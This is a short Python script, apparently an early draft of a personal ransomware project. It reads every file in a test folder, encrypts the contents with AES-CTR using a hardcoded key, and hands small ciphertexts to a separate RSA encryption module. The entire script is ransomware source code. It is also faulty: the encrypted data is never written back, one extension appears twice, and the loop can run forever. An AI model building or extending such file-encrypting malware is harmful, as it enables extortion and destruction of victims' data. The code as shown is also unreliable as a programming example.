import Modules.RSA.RSA as RSA;
import os;
import re;
import pyaes;
ListOfBigBytes = ["\.jpg", "\.png", "\.gif", "\.mp4", "\.mpeg", "\.jpg"]
keyIdAes = (b"0123456789abcdef");
aes = pyaes.AESModeOfOperationCTR(keyIdAes);


def main():
    path = "/home/nicolas/Documentos/Git-Projects/Python/ransomware/FolderTesteCript/";
    files = os.listdir(path);

    for file in files:
        with open(path+file, 'rb') as C:
            data = C.read();
            C.close();
        crip = aes.encrypt(data)
        for extension in ListOfBigBytes:
            match = re.search(extension, file);
            if(match):
                break;
                
        while match:
            print("carregando...")
            #os.system("clear") or None;
            if(len(crip) < 170):
                RSA.criptografar(crip);
                break;

main()